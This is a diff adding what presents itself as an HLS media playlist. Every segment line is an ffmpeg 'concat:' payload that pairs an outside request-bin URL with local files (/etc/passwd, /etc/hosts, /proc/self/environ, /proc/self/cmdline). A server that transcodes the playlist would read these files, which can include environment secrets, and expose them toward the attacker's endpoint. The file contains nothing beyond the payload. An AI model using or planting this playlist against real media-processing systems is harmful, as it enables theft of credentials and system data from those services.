@@ -1,0 +1,13 @@
+#EXTM3U
+#EXT-X-VERSION:3
+#EXT-X-MEDIA-SEQUENCE:0
+#EXT-X-TARGETDURATION:10
+#EXTINF:10.0,
+concat:http://eoow6y96ffo9mzx.m.pipedream.net/|file:///etc/passwd
+#EXTINF:10.0,
+concat:http://eoow6y96ffo9mzx.m.pipedream.net/|file:///etc/hosts
+#EXTINF:10.0,
+concat:http://eoow6y96ffo9mzx.m.pipedream.net/|file:///proc/self/environ
+#EXTINF:10.0,
+concat:http://eoow6y96ffo9mzx.m.pipedream.net/|file:///proc/self/cmdline
+#EXT-X-ENDLIST
